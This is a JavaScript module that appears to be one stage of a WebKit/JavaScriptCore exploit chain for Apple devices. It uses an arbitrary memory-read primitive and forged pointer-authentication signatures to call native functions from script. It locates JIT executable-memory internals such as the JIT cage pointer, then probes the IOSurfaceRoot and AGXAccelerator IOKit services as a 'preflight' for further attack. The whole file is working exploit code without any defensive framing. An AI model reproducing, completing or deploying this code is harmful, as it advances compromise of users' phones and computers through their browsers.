const requiredAddress = (name, address) => {
    if (address === null) throw new Error(name + " export is missing");
    return address;
};

const hex = (value) => "0x" + BigInt(value).toString(16);

class NativeCString {
    constructor(reader, value) {
        const encoded = new TextEncoder().encode(value + "\0");
        const [storage, address] = reader.allocZeroBufferPair(encoded.byteLength);
        storage.set(encoded);
        this.storage = storage;
        this.address = address;
    }
}

class IOKitProbe {
    constructor({ reader, seedbell, log }) {
        this.reader = reader;
        this.seedbell = seedbell;
        this.log = log;
        this.targets = seedbell.targets;
        this.mainPortStorage = reader.allocZeroBuffer(8);
        this.functions = {
            ioMainPort: seedbell.pacda(
                requiredAddress("IOMainPort", this.targets.ioMainPort),
                0n
            ),
            ioServiceMatching: seedbell.pacda(
                requiredAddress("IOServiceMatching", this.targets.ioServiceMatching),
                0n
            ),
            ioServiceGetMatchingService: seedbell.pacda(
                requiredAddress(
                    "IOServiceGetMatchingService",
                    this.targets.ioServiceGetMatchingService
                ),
                0n
            ),
            ioObjectRelease: seedbell.pacda(
                requiredAddress("IOObjectRelease", this.targets.ioObjectRelease),
                0n
            )
        };
    }

    openMainPort() {
        const bootstrapPort = this.reader.read32(
            requiredAddress("bootstrap_port", this.targets.bootstrapPortSlot)
        );
        const status = Number(this.seedbell.callSigned(
            this.functions.ioMainPort,
            [BigInt(bootstrapPort), this.mainPortStorage]
        ) & 0xffffffffn);
        const mainPort = this.reader.read32(this.mainPortStorage);
        this.log(
            "[RELAXIN] IOMainPort status=" + status +
            " bootstrap=" + hex(bootstrapPort) +
            " main=" + hex(mainPort)
        );
        if (status !== 0 || mainPort === 0) {
            throw new Error("IOMainPort failed with status " + status);
        }
        return mainPort;
    }

    findService(mainPort, className) {
        const name = new NativeCString(this.reader, className);
        this.log(
            "[RELAXIN] matching " + className +
            " name=" + hex(name.address) +
            " function=" + hex(requiredAddress(
                "IOServiceMatching",
                this.targets.ioServiceMatching
            ))
        );
        const matching = this.seedbell.callSigned(
            this.functions.ioServiceMatching,
            [name.address]
        );
        this.log("[RELAXIN] matching dictionary=" + hex(matching));
        if (matching === 0n) throw new Error("IOServiceMatching failed for " + className);

        const service = this.seedbell.callSigned(
            this.functions.ioServiceGetMatchingService,
            [BigInt(mainPort), matching]
        );
        this.log("[RELAXIN] service " + className + "=" + hex(service));
        if (service !== 0n) {
            this.seedbell.callSigned(
                this.functions.ioObjectRelease,
                [service]
            );
        }
        return Number(service & 0xffffffffn);
    }
}

function resolveExecutableMemoryTargets(seedbell, log) {
    const metaAllocator = seedbell.targets.metaAllocatorAllocate;
    const targets = {
        metaAllocatorAllocate: metaAllocator.address,
        metaAllocatorSymbol: metaAllocator.symbol,
        executableMemoryCreateImpl: seedbell.targets.executableMemoryCreateImpl,
        linkCode: requiredAddress("JSC::LinkBuffer::linkCode", seedbell.targets.jscLinkCode),
        secureHashPinAllocate: seedbell.targets.secureHashPinAllocate,
        jitCagePointerSlot: requiredAddress("jitCagePtr", seedbell.targets.jitCagePointerSlot)
    };

    log(
        "[RELAXIN] executable targets meta=" + hex(targets.metaAllocatorAllocate) +
        " createImpl=" + (targets.executableMemoryCreateImpl === null
            ? "missing"
            : hex(targets.executableMemoryCreateImpl)) +
        " linkCode=" + hex(targets.linkCode) +
        " hashPin=" + (targets.secureHashPinAllocate === null
            ? "missing"
            : hex(targets.secureHashPinAllocate))
    );
    return targets;
}

export function probeRelaxinEnvironment(reader, seedbell, log = () => {}) {
    log("[RELAXIN] resolving executable-memory ABI");
    const executableMemory = resolveExecutableMemoryTargets(seedbell, log);
    log("[RELAXIN] probing IOKit services");
    const ioKit = new IOKitProbe({ reader, seedbell, log });
    const mainPort = ioKit.openMainPort();
    const services = {
        IOSurfaceRoot: ioKit.findService(mainPort, "IOSurfaceRoot"),
        AGXAccelerator: ioKit.findService(mainPort, "AGXAccelerator")
    };
    const ready = services.IOSurfaceRoot !== 0 && services.AGXAccelerator !== 0;
    log("[RELAXIN] preflight=" + (ready ? "ready" : "service-blocked"));
    return { ready, mainPort, services, executableMemory };
}
